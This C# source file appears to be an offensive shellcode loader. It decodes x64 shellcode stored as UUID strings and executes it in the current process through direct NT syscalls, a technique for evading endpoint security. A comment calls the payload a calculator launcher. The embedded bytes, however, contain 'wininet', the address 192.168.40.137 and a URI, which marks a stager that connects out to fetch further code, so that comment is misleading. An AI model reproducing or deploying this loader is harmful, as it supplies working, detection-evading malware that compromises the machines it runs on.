using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
//using System.Configuration.Install;
using System.Threading;
using System.IO.Compression;
using System.IO;

using Data = SharpWhispers.Data;
using Syscall = Syscalls.Syscalls;

namespace BasicProcessInjection
{
    class Program
    {

        //public static string base64String = "";       // Step 1: Decode Base64


        //public static byte[] DecompressGzip(byte[] gzipBytes)
        //{
        //    using (var compressedStream = new MemoryStream(gzipBytes))
        //    using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
        //    using (var resultStream = new MemoryStream())
        //    {
        //        zipStream.CopyTo(resultStream);
        //        return resultStream.ToArray();  // Return decompressed bytes
        //    }
        //}



        //calc-thread64
            public static byte[] Shellcode = ConvertUuidsToShellcode (new string[]{
"e48348fc-e8f0-00cc-0000-415141505251",
"d2314856-4865-528b-6048-8b5218488b52",
"b70f4820-4a4a-314d-c948-8b72504831c0",
"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
"48514152-528b-8b20-423c-4801d0668178",
"0f020b18-7285-0000-008b-808800000048",
"6774c085-0148-44d0-8b40-208b48184901",
"56e350d0-314d-48c9-ffc9-418b34884801",
"c03148d6-41ac-c9c1-0d41-01c138e075f1",
"244c034c-4508-d139-75d8-58448b402449",
"4166d001-0c8b-4448-8b40-1c4901d0418b",
"58418804-5841-0148-d05e-595a41584159",
"83485a41-20ec-5241-ffe0-5841595a488b",
"ff4be912-ffff-485d-31db-5349be77696e",
"74656e69-4100-4856-89e1-49c7c24c7726",
"53d5ff07-4853-e189-535a-4d31c04d31c9",
"ba495353-563a-a779-0000-0000ffd5e80f",
"31000000-3239-312e-3638-2e34302e3133",
"485a0037-c189-c749-c0bb-0100004d31c9",
"036a5353-4953-57ba-899f-c600000000ff",
"00c2e8d5-0000-4b2f-6b6e-30634f54536c",
"575f3230-3572-3259-4942-535f51423451",
"4d63584d-2d38-776f-3757-593766334274",
"67585637-6670-6f4a-5735-355252386f47",
"4f62664a-4879-786e-5a43-456845745855",
"67356e53-316d-3939-7642-31785a6e535a",
"6d695858-5857-3979-5a63-526454396564",
"524c4b58-6f57-534c-6f31-306e776e5f71",
"316c7778-4a45-3662-5863-647062574159",
"6e657379-645a-5474-544c-78776c39586e",
"79593170-6f75-6a35-5970-743749455839",
"554a7265-2d67-4b63-3851-674368517548",
"7a6b5430-7335-0056-4889-c1535a41584d",
"4853c931-00b8-a832-8400-000000505353",
"ebc2c749-2e55-ff3b-d548-89c66a0a5f48",
"1f6af189-525a-8068-3300-004989e06a04",
"ba495941-4675-869e-0000-0000ffd54d31",
"485a53c0-f189-314d-c94d-31c9535349c7",
"18062dc2-ff7b-85d5-c075-1f48c7c18813",
"ba490000-f044-e035-0000-0000ffd548ff",
"eb0274cf-e8aa-0055-0000-53596a405a49",
"e2c1d189-4910-c0c7-0010-000049ba58a4",
"0000e553-0000-d5ff-4893-53534889e748",
"8948f189-49da-c0c7-0020-00004989f949",
"899612ba-00e2-0000-00ff-d54883c42085",
"66b274c0-078b-0148-c385-c075d258c358",
"4959006a-c2c7-b5f0-a256-ffd590909090" });


        static byte[] ConvertUuidsToShellcode(string[] uuids)
        {
            byte[] Shellcode = new byte[uuids.Length * 16];
            int index = 0;

            foreach (string uuid in uuids)
            {
                try
                {
                    Guid guid = Guid.Parse(uuid);
                    byte[] bytes = guid.ToByteArray();
                    Array.Copy(bytes, 0, Shellcode, index, bytes.Length);
                    index += bytes.Length;
                }
                catch (FormatException)
                {
                    Console.WriteLine($"Invalid UUID format: {uuid}");
                }
            }

            return Shellcode;
        }


        static void Main(string[] args)
        {

            //byte[] gzipBytes = Convert.FromBase64String(base64String);

            // // Step 2: Decompress GZip
            // byte[] Shellcode = DecompressGzip(gzipBytes);
            //uint pid;
            IntPtr HProc;


            //uint pid = 0;



            //byte[] Sh = Shellcode;
            IntPtr ShellcodeSize = (IntPtr)Shellcode.Length;


           
                // Local Process
                HProc = (IntPtr)(-1);

            

            /* Allocate */
            //Console.WriteLine("");
            //Console.WriteLine("==== Allocating Memory ====");



            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr AllocationSize = ShellcodeSize;


            Data.Native.NTSTATUS retValue = Syscall.NtAllocateVirtualMemory(
                HProc, 
                ref BaseAddress, 
                IntPtr.Zero, 
                ref AllocationSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,Data.Win32.WinNT.PAGE_READWRITE);



            //if (retValue != Data.Native.NTSTATUS.Success)
            //{
            //    Console.WriteLine("Error Allocating memory!");
            //    Console.WriteLine("[*] Return Value : " + retValue);
            //    return;
            //}

            //Console.WriteLine("[*] Allocated : " + AllocationSize + " bytes");
            //Console.WriteLine("[>] Allocation Address : " + string.Format("{0:X}", BaseAddress.ToInt64()) + "\n");



            /* Write Memory */
            //Console.WriteLine("");
            //Console.WriteLine("==== Writing Shellcode in the Remote Process.. ====");


            // Get Pointer to local shellcode
            IntPtr Shellcodeptr = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = Shellcode)
                {
                    Shellcodeptr = (IntPtr)p;
                }
            }

            uint res = 0;
            res = Syscall.NtWriteVirtualMemory(HProc, BaseAddress, Shellcodeptr, (uint)ShellcodeSize);


            //if (res != (uint)ShellcodeSize)
            //{
            //    Console.WriteLine("Error Writing memory!");
            //    Console.WriteLine("[*] Return Value : " + res);
            //    return;
            //}


            /* Protect Memory - RX */
            //Console.WriteLine("");
            //Console.WriteLine("==== Setting Memory to RX.. ====");

            // NtProtectVirtualMemory will change the protection of the whole page
            // The value of AllocationSize will be overwritten
            AllocationSize = ShellcodeSize;
            IntPtr ProtectAddress = BaseAddress;
            Syscall.NtProtectVirtualMemory(HProc, ref ProtectAddress, ref AllocationSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);

            /* RUN */


            // Execute   
            //Console.WriteLine("");
            //Console.WriteLine("==== Creating Thread.. ====");

            IntPtr HThread = IntPtr.Zero;
            res = (uint)Syscall.NtCreateThreadEx(ref HThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, HProc, BaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            //Console.WriteLine("");
            //Console.WriteLine("Press any key to exit..");
            //Console.ReadLine();

            WaitForSingleObject(HThread, 0xFFFFFFFF);


        }
        [DllImport("kernel32.dll", SetLastError = true)]

        
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    }
}